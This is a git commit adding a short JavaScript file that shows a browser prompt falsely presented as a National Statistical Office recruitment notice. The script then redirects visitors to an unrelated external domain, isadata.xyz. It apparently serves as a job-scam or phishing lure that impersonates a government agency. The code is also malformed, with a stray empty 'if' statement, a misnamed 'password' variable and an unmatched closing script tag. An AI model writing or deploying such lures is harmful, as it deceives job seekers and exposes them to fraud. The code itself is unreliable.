d74a28f6aa3af1d0868717a8ccd25d0ad0c16f9a
newetijazz1 <newetijazz1@gmail.com>
2026-01-12 09:53:23 +0100

    Create nsojob.js

---
+++ nsojob.js
@@ -0,0 +1,7 @@
+var password = 'National Statistical Office Recruitment'
+password=prompt('NOTICE: The National Statistical Office (NSO) is currently recruiting enumerators, press OK to apply for the','National Statistical Office Recruitment');
+if (password != 'National Statistical Office Recruitment');
+if (password != 'National Statistical Office Recruitment') {
+location.href='https://www.isadata.xyz/NSO-Recruitment';
+}
+</script>
